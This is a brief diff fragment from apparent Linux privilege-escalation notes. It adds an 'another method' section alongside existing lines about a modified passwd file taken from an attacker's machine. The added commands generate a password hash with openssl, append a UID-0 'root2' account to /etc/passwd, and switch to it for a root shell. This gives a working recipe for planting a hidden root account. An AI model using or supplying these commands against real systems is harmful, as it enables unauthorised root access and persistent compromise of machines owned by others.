@@ -375,6 +375,13 @@ $1$user$sfjfd.3434jLJljdiqj:root:/root:/bin/bash
 # copy back passwd file from attacker's pc on box. run
 su user
 #it will ask for password type admin and we get root shell
+
+ANother method:
+student@debian:~$ openssl passwd evil
+AK24fcSx2Il3I
+student@debian:~$ echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd
+student@debian:~$ su root2
+
 ---------------------------------------------------------------------------------------
 
 
